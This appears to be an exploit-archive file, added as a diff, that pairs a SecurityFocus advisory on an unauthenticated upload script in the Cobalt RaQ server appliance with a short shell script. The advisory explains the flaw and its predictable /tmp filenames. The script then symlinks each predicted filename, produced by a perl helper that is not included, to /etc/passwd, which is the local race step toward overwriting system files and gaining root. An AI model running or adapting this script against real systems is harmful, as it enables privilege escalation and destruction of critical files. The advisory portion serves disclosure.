@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/4252/info
+ 
+Cobalt RaQ is a server appliance for Internet-based services. It is distributed and maintained by Sun Microsystems.
+ 
+The 'MultiFileUpload.php' script is not sufficiently protected from outside access. While other sensitive administrative scripts are protected with HTTP authentication, 'MultiFileUpload.php' is not. Remote clients may invoke the execution of this script without valid administrator credentials.
+ 
+In doing so, it is possible for an attacker to upload files that are created on the server filesystem as any user.
+ 
+Furthermore, the uploaded files are stored in '/tmp' with predictable filenames. If the attacker has local access to the system, this vulnerability can be exploited to overwrite a file of equal user and group ownership through the use of a symbolic link.
+ 
+Successful exploitation of this vulnerability by an attacker with local access may result in a compromise of root privileges. Attackers without local access may be able to cause a denial of service through consumption of disk space.
+
+#!/bin/sh
+#Script for creating symlinks from output of local-timerace-xtr
+
+for foo in `perl -x xtr-timerace-xtr.pl`
+do
+ln -s /etc/passwd $foo
+done
